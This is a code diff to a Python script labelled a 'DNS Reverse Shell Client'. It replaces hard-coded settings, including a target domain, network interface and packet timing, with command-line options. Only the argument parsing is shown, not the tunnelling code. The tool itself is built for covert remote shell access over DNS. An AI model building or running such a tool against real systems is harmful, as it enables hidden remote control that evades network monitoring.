@@ -6,12 +6,45 @@ from time import sleep
 
 import subprocess
 import threading
+import argparse
 
-DOMAIN = "platypew.social"
-IFACE = "eth0"
-INTERVAL = 0.02
-PULSE = 1
-TIMEOUT = 5
+parser = argparse.ArgumentParser(description="DNS Reverse Shell Client")
+parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
+parser.add_argument('-i',
+                    '--interface',
+                    action='store',
+                    type=str,
+                    help='Interface to use',
+                    default='eth0')
+parser.add_argument('-I',
+                    '--interval',
+                    action='store',
+                    type=float,
+                    help='Interval between sending DNS packets',
+                    default=0.02)
+parser.add_argument(
+    '-p',
+    '--pulse',
+    action='store',
+    type=float,
+    help='How often to pulse the server in seconds (Lower number means faster response time)',
+    default=0.02)
+parser.add_argument(
+    '-t',
+    '--timeout',
+    action='store',
+    type=int,
+    help=
+    'How long it takes to recover from lost packet in seconds (Lower number means faster recover time)',
+    default=5)
+
+args = parser.parse_args()
+
+DOMAIN = args.domain
+IFACE = args.interface
+INTERVAL = args.interval
+PULSE = args.pulse
+TIMEOUT = args.timeout
 
 FRAG_LEN = 70 - len(DOMAIN)
 
